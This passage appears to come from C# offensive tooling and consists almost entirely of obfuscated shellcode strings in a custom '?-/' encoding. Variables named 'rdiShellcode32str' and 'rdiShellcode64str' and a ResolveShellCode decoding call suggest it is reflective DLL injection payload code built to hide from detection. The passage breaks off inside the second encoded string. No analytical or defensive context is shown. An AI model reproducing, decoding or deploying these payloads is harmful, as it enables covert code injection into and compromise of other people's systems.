?-/-/ ?-/-/-?-/-/-? /   /         ? /   /   ? /  /        ?-/-/-?-/-/-?-/-/-? /    / ?-/ /  ?-/  /    ? /   / ? /         /  ?-/ /  ?-/-/   ? /         /     ? /   /       ?-/       /      ?-/   /      ?-/  /        ?-/     / ?  /-/ ? /   /       ?-/       /      ?-/   /      ?-/  /    ?-/     /       ?-/-/        ? / /      ?-/ /   ? /    / ?-/      /    ?-/  /-?-/      /     ? /   / ?-/     /      ?-/-/-? / /       ?  /    /       ? /   /       ?-/       /      ?-/   /      ?-/  /    ? /   /         ? /    /        ?-/   /      ? /    /    ?-/-/-?-/-/-?-/-/-? /   /         ? /         /    ? /   / ?  /  /    ?-/-/    ? /   /       ?-/      /        ?-/   /      ?-/      /-?-/ /     ? /   /  ? /       /    ?-/-/-?-/-/-?-/-/-?-/     /         ?  /-/      ?-/ /     ? /   /    ? /      /      ?-/-/-?-/-/-?-/-/-? /         /   ?  /   /    ?-/ /      ? /    / ?-/      /     ?  /     /     ? /   /       ? /    /        ?-/   /      ? /    /    ?-/-/-?-/-/-?-/-/-?-/     / ?  / /-? /   /       ?-/      /        ?-/   /      ?-/     /      ? /   /       ?-/        /    ?-/   /      ?-/   /  ? /   /   ? /         /  ?-/ /     ? /   /  ? /    /      ?-/-/-?-/-/-?-/-/-? /   /         ?-/         /  ?-/   /      ?-/  /        ? /   /         ? /       /  ?-/   /      ? /  /        ?-/-/-?-/-/-?-/-/-? /   /       ?-/         /  ?-/   /      ?-/  /        ?-/    /   ?  /-/  ? /-/     ?  /   /       ?  /     /   ?-/      /       ?-/-/   ?-/-/-?-/     / ?  / /-? /    / ? /  /    ?-/   /      ?-/      /        ? /        /    ?  /     /     ? /  /       ?-/-/-?-/-/-?  /    /       ?  /    / ? /  /         ? /         /       ? /         /     ? /     /        ?-/   /        ?-/-/-?-/     / ?  / /-? /-/      ?-/-/     ? /    / ?-/       /  ?-/-/ ? /   /         ? /         /       ? /         /   ?  /   /  ?-/ /      ?-/   /       ?  /     /     ? /  /       ?-/-/-?-/-/-?  /    /       ?  /    / ? /   /         ?-/        /    ?-/   /      ?-/   /      ?-/-/   ? /         /    ? /-/       ? /         /  ?-/  /-?-/        /         ? /-/      ?-/-/     ?-/-/   ? /         /     ?-/      /      ? /   /         ?  /    /-? /   /       ?-/        /    ?-/   /      ?-/   /      ?  /    /   ? /      /     ? /   /         ? / /      ?-/   /      ?-/   /  ? /   /         ?  /    /        ? /   /         ?-/      /        ?-/   /      ?-/   /  ?-/        /         ?  /    /   ? /      /     ? /-/      ?-/-/     ? /   /         ?  /    /        ? /    / ? / /      ?-/   /      ?-/       /  ?-/        /         ? /   / ? /         /  ?-/  /-?  /    /   ? /      /     ? /   /         ?-/       /      ?-/   /      ?-/  /    ? /   /       ?-/      /        ?-/   /      ?-/  /        ?-/     /         ?-/        /    ?-/   /      ?-/     /      ? / /    ? /    /      ? /   /         ?-/         /  ?-/   /      ?-/   /      ? /   /         ? /-/        ?-/   /      ?-/  /-?  /   /     ?-/ / ? /   /         ?-/      /        ?-/   /      ?-/      /    ? /   /       ? /   /  ?-/   /      ? /    /    ?-/-/-?-/-/-?-/-/-? /   /         ? /        / ? /  /        ?-/-/-?-/-/-?-/-/-?-/-/   ?  /    /   ? /   /       ? / /      ?-/   /      ?-/   /  ? /   /         ?-/       /-?-/ /  ? /   /   ? /         /  ?-/ /     ? /   /  ? /   /      ?-/-/-?-/-/-?-/-/-? /   /         ? /-/        ?-/   /      ?-/  /    ?-/-/   ? /         /     ?-/        /-?  /     /     ?-/        /    ?-/   /      ?-/    /    ? /   /         ? /  /      ?-/ /      ? /   /       ?-/      /        ?-/   /      ?-/     /      ?-/-/   ?  /     / ? /   /         ?-/-/      ?-/-/   ? /         /     ? /   /       ?-/      /        ?-/   /      ?-/   /      ? /   /         ?-/-/        ? /   /   ?  /-/ ? / /      ?-/     /    ? /   /         ? /-/        ?-/   /      ?-/     /      ? /   /         ? / /      ?-/   /      ?-/    /    ? /  / ?-/-/     ?-/ /     ? /        /   ? /         /   ?  /   /     ?-/-/     ? /    / ?-/      /     ?-/-/  ?-/-/   ? /         /     ?-/        /-?-/        /     ?  /     /     ?  / /    ? /   /       ?-/-/       ? /   / ? /         /         ?-/-/    ? /   /         ?-/      /        ?-/   /      ?-/   /      ? /   / ? /         /  ?-/-/    ? /   /       ?-/      /        ?-/   /      ?-/   /      ? /   /         ?-/-/        ? /   /   ?  /-/ ? / /       ?  / /        ? /   /         ? / /      ?-/   /      ?-/   /  ? /   /         ? /-/        ?-/   /      ?-/  /    ? /   / ? /  /    ?-/   /      ?-/      /-?-/-/-? / /      ?-/  /   ?-/     / ? /         /  ?-/      /    ?-/     /         ?  /   /  ? / /        ?-/ /      ? /-/     ? /   /  ?-/   /      ? /    /    ?-/-/-?-/-/-?-/-/-?  /   /  ?-/-/   ?-/-/-?-/-/-?-/        /-?  /     /     ?-/        /    ?-/   /      ?-/      /        ? /   /         ?-/       /-?-/   /  ? /   / ? /         /        ?-/  /-? /   /       ? / /      ?-/   /      ?-/   /  ? /   /   ? /         /  ? / /       ? /  /        ? /   /         ? /-/        ?-/   /      ?-/  /-? /   / ? /        /         ?  /  /        ?-/-/-?-/-/-?-/-/-?-/-/-? / /      ? / /     ? /   /         ? /        /         ?  /  /    ?-/-/-?-/-/-?-/-/-? /   / ? /         /         ?-/-/    ?-/-/   ?  /     / ? /   /       ? /  /    ?-/   /      ?-/   /  ? /   / ?-/      /   ?-/-/-? / /      ?-/         /     ? /   /         ?-/-/       ?-/-/   ? /         /     ?-/        /-?  /     /     ?-/        /    ?-/   /      ?-/    /    ? /   /         ? / /         ?-/-/        ? /   /         ?  /   /  ? /   /         ?-/       / ?-/ /  ?-/-/   ?  /    /   ?-/-/   ? /         /     ? /   /       ?-/      /        ?-/   /      ?-/   /      ? /   / ?-/      /  ?-/-/-? / /      ?-/    /         ? /   /         ? /  /    ?-/   /      ?-/    /    ? /   /         ?-/-/-? /   /   ? /         /  ? /  / ?-/-/     ?-/ /     ? /        /   ? /         /  ?  /   /     ?-/-/     ? /   / ? /         /  ?-/-/  ?-/-/   ? /         /     ?-/        /-?-/        /     ?  /     /     ?  / /     ? /   /       ?-/-/      ? /   / ? /         /        ?-/-/    ? /   /         ?-/      /        ?-/   /      ?-/   /      ? /   / ? /         /  ?-/-/    ? /   /       ?-/      /        ?-/   /      ?-/   /      ? /   / ?-/      /  ?-/-/-? / /       ?  / /     ? /   /         ? /  /    ?-/   /      ?-/   /  ? /   / ? /         /         ?-/   /  ? /   /       ? /  /    ?-/   /      ?-/   /  ? /   / ?-/      /   ?-/-/-? / /       ? /      /     ? /   /         ? /-/        ?-/   /      ?-/  /-?-/ /     ? /        /   ?-/      /         ?-/  /-?-/     / ?  /-/ ?-/     / ?  /     /     ? /-/  ?-/     /         ?-/       /       ?-/-/      ?-/ /     ? /   / ? /       /      ?-/-/-?-/-/-?-/-/-? /    / ? / /       ?-/      /-?-/-/   ?  /    /-? /   / ? /  /      ?  /   /      ?-/-/-?-/ /     ? /   /  ? /    /     ?-/-/-?-/-/-?-/-/-? /   /         ?-/ /    ?-/     / ?  / /-?-/      /      ? /   /         ? /         /   ? /         /   ?  /   /  ?-/  /         ?-/   /     ? /         /    ? /   /         ?  /-/         ? /         /   ?  /   /    ?-/   /-? /   / ?  /  /      ?-/-/ ? /         /   ?  /   /   ?-/   / ? /   /   ? /         /  ? / /       ?-/  /    ? /   /   ?  / /-? / /       ?-/ /   ? /-/      ?-/-/        ?-/        /        ? /-/      ?-/-/ ? /   /   ?  /-/ ?-/        /         ?-/ /     ?-/      /        ? /         /   ?  /   /     ?-/      / ? /-/      ?-/-/    ?-/        /        ? /-/      ?-/-/  ?  /   /     ?  /    / ? /   /   ?  / /-? / /       ?-/   /-? /   /   ?  /-/ ? / /       ?-/-/     ? /-/      ?-/ /      ?-/        /        ?  /   /     ?-/    / ? /   /   ?  / /-? / /       ?-/ /       ? /   /   ?  /-/ ? / /      ?-/-/       ? /        /    ? /  /        ?-/-/-?-/-/-?-/-/-?  /   /     ?-/  /      ? /   /         ?-/      /        ?-/   /      ?-/ /      ?  /   /     ?-/  /    ? /   /   ?  /-/ ? / /       ?-/-/    ? /-/      ?-/   /  ?  /   /     ?  /  /    ? /   /         ?-/      /        ?-/   /      ?-/ /      ? /   /   ?  /-/ ? /-/      ?-/      /    ?-/         /-?-/ /     ?-/      /         ? /         /    ? /   /       ?-/      /        ?-/   /      ?-/ /      ?  /    /       ?-/-/      ?-/-/-?-/-/-?-/-/-?-/-/    ? / /      ?-/-/         ?-/ /   ?-/-/-?-/-/  ?-/-/-?-/-/-? /   /       ?-/      /        ?-/   /      ?-/ /      ? /    / ?-/       /      ?-/   /      ?-/ /      ?-/        / ?-/        /-? /   /         ?-/       /-?  /   /  ?  /     /     ? / /        ?  /   /      ?-/-/   ? /         /     ?-/        /-?  /     /     ?-/        /    ?-/   /      ?-/      /    ?-/ /     ? /        /   ?-/      /         ?-/-/      ?-/       / ? /   / ? /         /        ?-/    /-?-/     /         ?  /    /        ?-/ /     ? /   /-?-/        /     ?  /     /     ?  /     /     ?  /     /     ? /-/      ?-/-/-? /-/      ?-/-/-? /-/      ?  /     /     ?  /     /     ?-/        /    ?-/   /      ?-/      /    ? /   / ? /        /         ? /         /      ?-/-/-?-/-/-?-/-/-?-/-/-? / /      ?-/   /        ? /   /         ? /   /   ? /         /  ?-/-/-?-/-/-?-/-/-? /   /         ? / /      ?-/  /    ?-/ /  ? /   /         ?-/-/      ? /   /   ? /         /  ? / /      ?-/  /  ?-/     / ?  /   /       ?-/      /         ? /-/      ?-/-/-?-/        /     ?-/        /   ?  /     /     ?  /-/        ? /    / ? / /        ?-/-/    ? /   /         ?-/-/      ? /   /   ? /         /  ? / /       ?  /    / ? /   /         ? /-/        ?-/   /      ?-/  /-?-/     / ? /         /  ?-/      /    ?-/        /-?-/        /-? /   /         ?-/      /         ?-/    /-?-/        /   ?-/-/   ? /         /     ?  /     /     ?  /-/        ? /   / ? /        /        ?-/   /      ? /   /  ?-/-/-?-/-/-?-/-/-?-/-/-?-/ /     ? /   /  ? /       /   ?-/-/-?-/-/-?-/-/-? /   / ? /  /     ? /  /    ?-/-/-?-/ /     ? /   /  ? /      /   ?-/-/-?-/-/-?-/-/-? /   /         ?-/        /     ? /  /-?-/-/   ?  / / ? /   /         ? /-/      ?-/  /    ? /   /   ?  /   /       ?-/ /     ? /   /  ? /    /       ?-/-/-?-/-/-?-/-/-? /   / ? /  /  ?-/  /-?-/-/-?-/ /     ? /   /  ? /   /       ?-/-/-?-/-/-?-/-/-? /   /         ? /  /  ?-/   /  ? /   /         ?-/       /    ?-/   /      ?-/-/   ?  /     / ? /   / ? /-/-?-/   /      ?-/     /  ?-/-/-?-/-/   ?  /-/   ? /   /   ?  /   /       ? / /      ? / /        ? /   /         ?-/     /     ? /         /         ?-/      /        ?-/   /      ?-/  /        ?-/-/-?-/-/-?-/-/-?-/-/-?-/-/   ?  /    /   ? / /      ? /-/    ? /   /        ?-/-/      ? /   /  ? /         /  ? / /      ?-/  /        ? /   /         ? /-/        ?-/   /      ?-/  /        ?-/ /     ? /         /-? /         /  ?-/-/   ? /         /       ? /         /   ?  /-/-?-/ /   ?-/       /-? /   /         ?  /   /  ? /   /        ?-/-/      ? /   /  ? /         /  ? / /       ?  /   /         ? /   /       ? /-/        ?-/   /      ?-/  /        ? /   /         ? /-/      ?-/  /    ? /   /         ? /   /  ?-/   /      ? /   /  ?-/-/-?-/-/-?-/-/-?-/     /         ?-/      /        ?-/   /      ?-/  /        ? / /       ?-/-/    ? /   /   ?  /-/ ? / /       ?-/  / ? /   /         ?-/      /        ?-/   /      ?-/     /  ? /   / ? /         /         ?-/-/    ?-/      /    ? /   / ? /         /   ?-/-/  ? /   /       ?-/      /        ?-/   /      ?-/     /  ?-/     /         ? /         /       ? / /    ? /       /  ?  /   /     ?-/   /  ?-/ /     ? /        /   ?-/-/         ? /   /         ?-/      /      ?-/  /        ?  /     /     ? /        /-?-/   /      ? /    /-?-/-/-?-/-/-?-/-/-?  /     /     ? /        /-?-/   /      ? /    /-?-/-/-?-/-/-?-/-/-? /    / ?-/-/    ? /   /      ? /   /         ?-/-/    ?-/  /    ?-/-/   ? /         /     ?  /     /     ?  /-/        ?-/        /         ?-/        /         ? /   /         ? /         /     ?  /   /     ?-/-/  ?-/     / ? /         /  ?-/         /     ?-/         /    ?-/         /   ?-/         / ? /   / ? /         /      ? /-/        ? /         /     ? /   / ?  /   /      ?-/ /      ? /-/-? /      / ?-/    /        ?-/-/-?-/-/-?-/-/-?-/        /   ?-/        /     ?-/        /      ? /   /         ?-/      /    ?-/ /  ?-/        /       ? /   /       ?-/       /      ?-/   /      ?-/  /    ? /   /         ? / /  ?-/ /  ?  /   /   ? /   /        ?-/-/-?-/-/-?-/-/-? /   /         ?-/       /-?-/    /        ?-/     / ?  /-/ ? /   /         ?-/         /    ?-/    /    ? /   /         ?-/     /    ? /   /       ?-/      /        ?-/   /      ?-/  /-? /   /         ?-/      /      ?-/      /-? /   /         ? /-/        ?-/ /      ? /  /-? /   /       ? /-/        ?-/   /      ?-/ /      ? /   /   ?  /   /       ? / /      ? /-/         ? /         /   ?  /   /     ?-/ /      ?-/     / ?  /     /     ? /   /   ?  / /         ? / /      ?-/   / ? /   /         ? /-/        ?-/   /      ?-/  /-? /   /        ?-/-/    ?-/    /       ? /         /   ?  /-/ ?-/ /   ?-/      /-?-/         /       ?-/ /     ? /         /-? /         /  ? /  /    ?-/-/   ? /   / ? /         /   ?  /  /    ?-/-/   ?  /-/-?-/       / ?-/     /         ?  /     / ? / /    ?  /   /   ? /   /         ? /-/        ?-/   /      ?-/ /      ? /   /         ?-/      /        ?-/    /  ?-/   /  ?-/     / ?  / /         ? /   /         ? /  /    ?-/    /  ?-/  /    ?-/-/   ? /         /    ? /   /       ? /  /    ?-/   /      ?-/  /-? /   /   ?  /     /     ? / /      ?-/    /         ? /   /         ?-/    /-?-/     / ?  /     /     ?-/-/   ?  /   /    ? /   / ? /         /  ?-/-/    ? /   /       ?-/      /        ?-/   /      ?-/  /        ?-/ /     ? /         /-?-/      /         ?-/-/-? /         /   ?  /-/       ?-/ /   ?-/-/   ?  /    /        ?-/      /         ? /  /        ? /  /     ?  /     /     ?-/-/-? / /       ?  /    /-? /    / ?-/-/    ?-/ /     ?-/     /         ?-/      /        ?-/   /      ?-/  /    ? / /      ?-/   /  ? /   /         ?-/      /        ?-/   /      ?-/  /        ?-/      /       ?-/     /         ?-/         /  ?-/   /      ?-/  /-? / /    ?  /-/       ? /   /         ?-/        /      ?-/  /    ? /   /   ?  / /-?-/ /     ? /   /   ? /-/       ?  /     /     ?  /     /     ?  /     /     ?-/     / ? /         /  ?-/         /     ?-/         /    ?-/         /   ?-/         / ? /   / ? /         /      ?-/ /      ? /         /     ? /   /         ? / /      ?-/   /      ?-/ /      ? /   /         ?-/      /        ?-/  /  ?-/   /      ? /    / ?-/-/    ?-/        /        ?-/ /     ? /        /   ?-/ /  ?-/ /      ? /   /         ?-/      /        ?-/  /  ?-/  /        ? /    / ?-/-/    ? /   /      ? /   /         ?-/-/    ?-/ /      ?-/-/   ? /         /    ?  /   /     ?  / /         ?";
            var rdiShellcode32 = ResolveShellCode(rdiShellcode32str);
            string rdiShellcode64str = "-/       /  ? /   /         ? /         /      ?-/       /  ? /   /       ?-/        /        ?-/-/        ?-/      /        ? /   /       ?-/       /  ?-/   /  ?-/       /      ? /   /       ?-/      /    ?-/  /    ? /   /       ?-/        /-?-/ /      ?-/        /     ?-/        /      ?-/        /       ?-/      /     ?-/        /    ?-/      /     ?-/        /     ?-/      /     ?-/        /      ?-/      /     ?-/        /       ?-/       /  ? /    / ? /-/    ? /      /         ?-/       /  ? /  /         ?  /   /      ? /    /    ?-/-/-?-/-/-?-/-/-?-/       /  ? /   /         ?  /    / ? /        /     ?-/       /      ? / /         ?-/   /        ?-/-/       ?  /   /  ? /      /   ?-/-/      ?-/-/-?-/-/-? /        /     ?-/       /   ?  /    /       ?-/-/  ? /  /-?-/       /  ? /   /       ?-/      /         ? /        /   ?-/       /      ? /   /         ?  /  /    ?  /   /  ? /    /      ?-/-/      ?-/-/-?-/-/-? /        /     ?-/        /        ? /      /    ?-/        /   ?  /  /         ?-/       /  ? /   /       ?-/      /         ? /         / ?-/       /      ? /   /         ?  /   /  ?  /   /  ? /  /         ?-/-/      ?-/-/-?-/-/-? /        /     ?-/ /      ?  /  /     ? /   /        ? /         /     ?-/       /      ? /   /         ?  /    /        ?  /   /  ? / /      ?-/-/      ?-/-/-?-/-/-? /        /     ? /       /     ? /       /       ?-/         /  ? /    /        ?-/       /  ? /   /       ?-/      /         ?  / /     ?-/       /  ? /   /         ?  /    /        ?  /   /  ?-/         /         ?-/-/      ?-/-/-?-/-/-? /        /     ?-/     / ?-/-/-? /     /        ? /    /         ?-/       /  ? /   /       ?-/      /         ?  /  /   ?-/       /  ? /   /         ?  / /      ?  /   /  ?-/        /  ?-/-/      ?-/-/-?-/-/-? /        /     ?-/      /        ?  /    /-?-/     /   ?  /  /    ?-/       /      ? /   /         ?  /    /-?  /   /  ?-/      /         ?-/-/      ?-/-/-?-/-/-?-/      /         ?-/     / ?  / /-?-/       /  ? /   /       ?-/      /         ? /         /         ?-/       /       ? /   /   ?  /  /        ?-/ /     ? /   /  ?-/  /  ?-/-/      ?-/-/-?-/-/-?-/       /       ? /   /   ?  /   /       ?-/ /     ? /   /  ?-/ /   ?-/-/      ?-/-/-?-/-/-?-/       /       ? /   /   ?  /     /     ?-/ /     ? /   /  ?-/-/    ?-/-/      ?-/-/-?-/-/-?-/       /  ? /   /   ?  /     /     ?-/ /     ? /   /  ?  /     / ?-/-/     ?-/-/-?-/-/-?-/       /  ? /   /   ?  / /         ?-/ /     ? /   /  ?  /    /  ?-/-/     ?-/-/-?-/-/-?-/       /       ? /   /   ?  /    /      ?-/ /     ? /   /  ?  /   /   ?-/-/     ?-/-/-?-/-/-?-/       /  ? /   /   ? /         /  ?-/ /     ? /   /  ?  /  /    ?-/-/     ?-/-/-?-/-/-?-/       /  ?-/         /         ? /  /      ?-/      /-?-/       /  ?-/-/   ?  /     /    ? /  /         ?-/      /   ?-/        /-?-/      /         ?-/-/-?-/-/-?-/ /     ? /   /   ?  /-/     ?-/-/     ?-/-/-?-/-/-? /        /    ? /-/-? /   /    ?-/-/-?-/-/-? /-/  ?-/     /       ?-/       / ?-/-/    ?-/ /     ? /   /   ? /         /-?-/-/     ?-/-/-?-/-/-?-/      /        ? /   /         ?-/       / ?-/     /      ?-/      /         ? /    / ?-/         /-?-/-/ ?-/      /         ? /   /  ? /         /     ?-/ /     ? /   /   ? /       /   ?-/-/     ?-/-/-?-/-/-?-/ /     ? /        /   ?-/       / ?-/-/      ?-/      /     ? /   /         ?  / /        ?-/ /     ? /        /   ?-/       /         ?-/  /-? /   /   ? /         /  ? / /      ?-/    /-?-/       /  ? /   / ? /         /   ?-/   /      ?-/      /        ? /   /         ?  /-/-?-/       /  ?-/-/   ?  /-/       ? /   /         ?-/        / ?-/-/    ? /   /   ?  / /-? / /       ?-/-/       ? /   /         ?-/ /       ?-/      /     ?-/-/   ?  /-/        ?  /   /     ?-/-/  ?-/-/   ?-/ /       ?-/     /         ?  / / ?-/ /     ?-/       / ?  / /        ?-/       /  ? /   / ? /         /   ?-/    /-?-/       /       ?-/    /   ?  /-/   ? / /       ?  /  /      ?-/       /  ? /    / ?-/       /       ?  /   / ?-/      /     ?  /     /     ?  / /    ? /   /         ?-/        /     ?  /   /     ?-/      /        ? /    / ? / /    ?  /     /     ?-/      /        ?-/-/   ? / /         ?-/        /-? /    / ?-/      /      ?  /     /     ?  /    /       ?  /-/        ?-/       /  ? /    / ?-/       /    ?  /     /     ?-/      /        ?-/   /     ?  /    /-? /   /         ? /         /     ?-/       /  ?-/-/   ?  /-/-?-/       /  ? /    / ?-/      /      ?  /     /     ?-/       /  ?  /    /       ?  /-/        ?-/       /  ?-/   /     ?  /-/-?-/       /      ?-/     /         ?  /    / ?-/ /     ? /   /   ?-/      /    ?-/-/     ?-/-/-?-/-/-?-/       /  ? /   /         ?-/       /         ?-/    /        ?-/      /     ? /        /     ?-/-/    ?-/-/-?-/-/-?-/-/-?-/      /     ? /        /    ?-/-/-?-/    /        ?-/-/-?-/-/-?-/      /     ? /   /         ?  / /    ?-/      /     ?  /     /     ?  / /     ?-/       /  ? /   /         ?  / /      ?-/       /  ? /   /   ? /         /  ? / /       ?-/  / ?-/      /        ? /    / ?-/       /  ?-/-/    ?-/      /     ? /        /    ?-/-/-?-/    /        ?-/-/-?-/-/-?-/      /     ? /   /         ?  / /    ?-/     / ?  /-/ ?-/      /     ?  /     /     ?  / /     ?-/       /  ? /   /         ?  / /      ?-/      /        ? /   /         ?-/         /   ? /  /       ?-/      /     ? /         /-?-/-/ ?-/-/-?-/-/-?-/-/-?-/      /         ? /   /  ?  /  /  ?-/ /     ? /   /  ? /       /       ?-/-/-?-/-/-?-/-/-? /   /         ?-/       /-?-/      /-? /   /       ?-/      /       ?-/      /-? /   /         ?-/        /      ?-/      /-?  /   /     ?-/ / ? /   /         ?  /-/  ?-/      /     ?-/-/   ?  / /    ? /   /        ?-/-/    ?-/    /         ? /   /      ?-/-/    ?-/  /     ?-/     /         ?-/        /       ?-/        /    ? / /    ?  /    /-?-/      /         ?-/     / ?  /     /     ?-/       /  ?-/         /         ? /  /   ?-/      /-?-/      /         ? /   /         ?  / /     ?-/       /  ?-/-/   ?  /     / ?-/       /  ? /   /       ? /  /     ?  /-/       ?-/ /     ? /        /   ?-/       / ?-/  /-? /-/  ?-/      /        ?-/     /         ? /  /       ?-/-/      ? / /     ?-/      /  ?-/       /      ? /    / ?-/       / ?-/    /-?-/       /      ?-/-/   ? /         /  ?-/      /         ? /   /         ?  /-/       ?-/      /         ?-/     /       ?-/     /      ? / /        ?-/   / ?-/      /     ? /   /         ?-/        /-?-/-/    ?-/      /     ? /   /         ?-/       /  ?  /     /  ?-/      /     ? /   /         ? /         /   ?-/      /         ?-/-/   ?  /-/      ?-/       /  ?-/-/   ?  /-/-?-/       /  ?-/-/   ?  /-/        ? /   /        ?-/-/    ?-/     /-? /   /      ?-/-/    ?-/  /     ?-/      /         ?-/     /         ?-/-/        ? / /    ?  /  /     ?-/ /     ? /        /   ?-/       / ?-/-/      ?-/      /         ?-/-/   ?  / /    ?-/       /   ? /   / ? /         /  ?-/    /-?-/      /        ?-/     /         ?  /-/        ? / /    ?  /-/ ?-/       /      ? /   /         ?  / / ?-/       /      ?-/    /   ?-/        /       ?-/    /        ?-/ /     ? /   /  ?  /  /  ?-/-/-?-/-/-?-/-/-?-/      /        ?-/     /       ? /         / ? /        /-?-/-/-?-/-/-?-/-/-?-/ /     ? /   /  ?  /-/         ?-/-/-?-/-/-?-/-/-?-/      /        ? /   /         ? /   /     ? /       /      ?-/-/-?-/-/-?-/-/-?-/       /      ?-/-/   ? /         /     ?-/      /         ?-/     /       ?-/     /      ?-/ /     ? /   /  ? /         /-?-/-/-?-/-/-?-/-/-?-/      /     ? /        /        ?-/-/  ?-/-/-?-/-/-?-/-/-?-/       /       ? /    / ?-/       /  ?-/-/        ?  /   /   ? /    /       ?-/-/-?-/-/-?-/-/-?-/      /         ?-/     / ?  /     /     ?-/      /     ? /   /         ?  / /     ?-/      /        ?-/     /       ? /  /       ?-/        /    ?-/ /     ? /   /    ?-/         /   ?  /     /     ?  /     /     ?  /     /     ? /   /         ?  /-/  ?-/      /     ?-/-/   ?  / /    ? /   /        ?-/-/    ?-/    /         ? /   /      ?-/-/    ?-/  /     ?-/     /         ?-/        /       ?-/        /    ? / /    ?  /    /-?  /   /   ?-/       /  ?  /     /     ?  /     /     ?  /     /     ?-/      /     ?-/ /     ? /        /   ?-/-/ ?-/ /     ? /        /   ?  /-/-? /-/  ? /         /   ?  /   /   ?-/ /  ? /-/  ? /   / ?  /    /         ?-/ /-? / /       ?-/ /       ?-/      /     ? /   /         ?-/-/        ?-/   /       ?  /     /     ?-/ /     ?-/-/-?-/-/-?-/       /  ?-/-/   ? /         /     ?-/       /      ?-/-/ ?-/  /-?-/-/ ?  /   /     ?-/       /   ? /-/  ? /   / ?  /    /         ?-/-/   ? / /       ?-/ /    ?-/   /       ?  /     /     ?-/ /     ?-/-/-?-/-/-?-/       /  ? /    / ?-/ /  ?-/-/   ?-/      /     ? /   /         ? /         /    ?  /   /     ?-/    /      ? /-/  ?-/      /     ?-/     /         ?  /-/      ? / /       ?-/  / ?-/   /       ?  /     /     ?-/ /     ?-/-/-?-/-/-?-/       /  ? /    / ?-/ /  ?-/-/   ?-/       /   ? /   /         ? /         /    ?-/       /  ? /         /   ?  /   /  ?-/ /      ?-/ /     ? /        /   ? /         /  ?  /   /     ?-/ /         ? /-/  ?-/      /     ?-/     /         ?  /-/    ? / /       ?-/  /-?-/   /       ?  /     /     ?-/ /     ?-/-/-?-/-/-?-/       /  ? /    / ?-/ /  ?-/-/   ?-/      /     ?-/ /     ? /        /   ? /         /    ?-/      /     ? /   /         ?-/ /      ?-/       /  ?-/-/ ?-/-/    ?-/ /-?-/       /       ?-/-/   ?  /-/    ?-/      /     ? /   /         ?-/      /    ?-/-/    ?-/       /   ?-/-/   ? /         /  ?-/       /      ?-/     /         ?  /-/-? / /       ? /   /    ?-/       /       ? /   /         ? /         /   ?-/      /         ?-/     /       ?-/     /       ?-/ /     ? /   /   ?-/       /      ?  /     /     ?  /     /     ?  /     /     ?-/       /      ? /   /         ? /-/ ? /        /   ?-/      /        ?-/     /       ? /         / ? /    /        ?-/-/-?-/-/-?-/-/-?-/ /     ? /   /  ?-/      /         ?-/-/ ?-/-/-?-/-/-?-/      /        ? /   /         ? /   /     ? /    /    ?-/-/-?-/-/-?-/-/-?-/      /         ? /   /         ?  /   /         ?-/       /      ?-/-/   ? /         /     ?-/       /   ? /    / ?-/      /    ?-/ /  ?  /   /     ?-/-/       ?-/      /         ?-/-/   ?  /   /        ?-/       /  ? /    / ?-/      /    ?-/  /-?-/      /        ?-/     /       ?-/     /      ? / /       ?  /    /    ?-/      /     ? /   /         ? /         /     ? /   / ?  /  /    ?-/-/    ? /   /       ?-/      /         ? /       /         ?-/ /     ? /   /  ? /   /-?-/-/-?-/-/-?-/-/-?-/      /         ?-/     /         ?  /   /        ? / /        ? /  /     ?-/      /     ? /         /   ?  /   /     ?-/ /      ?-/      /         ? /    / ?-/       /       ?  /     /     ?-/      /        ? /   /       ?-/         /   ? /  /       ?-/      /         ? /   /         ?  /  /   ?-/      /         ? /   /   ?  /-/ ? / /      ? / / ?-/       /       ? /   /         ?  /-/        ?-/      /     ?-/ /     ?-/ /      ?-/-/  ?-/     / ?  / /-?-/      /     ? /   /         ?  /-/     ?-/      /     ?-/    /   ?  /-/   ? /-/     ?  /    /      ?  /     /   ?-/      /       ?-/-/   ?-/-/-? /        /    ?  /     /     ? /  /       ?-/-/-?-/-/-?  /    /       ?  /    / ?-/     / ?  / /-? /  /         ? /         /        ? /         /     ? /     /        ?-/   /        ?-/-/-?-/      /     ? /    / ?-/ /  ?-/-/      ? /   /         ? /         /        ? /         /   ?  /   /  ?-/ /      ?-/   /       ?  /     /     ? /  /       ?-/-/-?-/-/-?  /    /       ?  /    / ?-/      /     ?-/-/   ? /         /     ?-/      /         ?-/-/   ?  /  /  ?-/       /  ? /    / ?-/ /  ? /  /        ?-/      /     ? /   /         ?-/        /    ? /   /      ?-/ /      ?-/      /     ?-/ /     ?-/ /      ?-/ /  ? /   /      ?-/      /     ?-/ /     ?-/ /       ?-/-/    ? /   /      ?-/      /     ? /   /         ?-/      /      ?-/ /      ?-/      /     ? /   /       ?-/      /        ? /   /      ?-/ /      ?-/      /     ?-/ /     ?-/ /       ?-/ /-?-/      /     ? /   /       ?-/        /  ?-/ /      ?-/       /       ? /    / ?-/        /  ?-/  /-?-/      /         ?-/     /         ?  / /       ? / /    ? /     /      ?  /   /     ?-/-/      ? /   /         ?-/      /         ? /       /         ? /   /       ?-/      /         ? /  /       ? /   /         ? /        /   ? /    /    ?-/-/-?-/-/-?-/-/-?-/       /  ?-/-/   ?  /    /   ? /   /         ?-/       /-?-/ /  ? /   /   ? /         /  ? / /      ? /  /   ? /   /         ? /  /     ? /  /       ? /   /         ?  /-/-?-/       /  ?-/-/   ?  /-/   ?-/      /     ?  /     /     ?  / /  ?-/      /        ? /   /         ?-/      /  ?-/       /      ? /   /         ?  /  /    ?-/      /        ? /   /         ? / /        ?-/ /      ?-/       /      ?-/-/   ?  /     / ?-/       /      ?-/-/   ?  /    /   ?-/       /   ? /   /         ?-/ /     ?-/       /  ? /   /   ?  /-/ ? / /      ?-/    /     ?-/       /  ? /   /         ? /  /     ? /         / ? /  / ?-/-/     ?-/ /     ? /        /   ?  /-/         ?  /   /     ?-/-/       ?-/       /  ? /    / ?-/        / ?-/-/  ?-/       /  ?-/-/   ?  / / ?-/       /   ? /   /         ?  /-/    ?  /     /     ?  / /     ?-/       /   ? /   / ? /         /         ?-/-/        ?-/       /   ? /   /       ?-/-/      ?-/       /   ? /   / ? /         /        ?-/-/        ?-/       /   ? /   /         ?-/ /     ?-/       /  ? /   /   ?  /-/ ? / /       ?  / /        ? /   /         ? /  /     ? /  /       ?-/      /         ?-/     / ?  /     /     ?-/      /        ?-/     /       ? /  /     ? /       /         ? / /      ?-/ /     ?-/      /     ? /   / ?  /     /   ?-/-/ ? / /        ?-/-/         ? /-/     ?  /-/       ?  /   /  ?-/-/   ?-/-/-?-/-/-?  /     /     ?-/        /     ? /         /         ? /   /         ?-/       /-?-/   /  ?-/       /  ? /   / ? /         /        ?-/  /-?-/   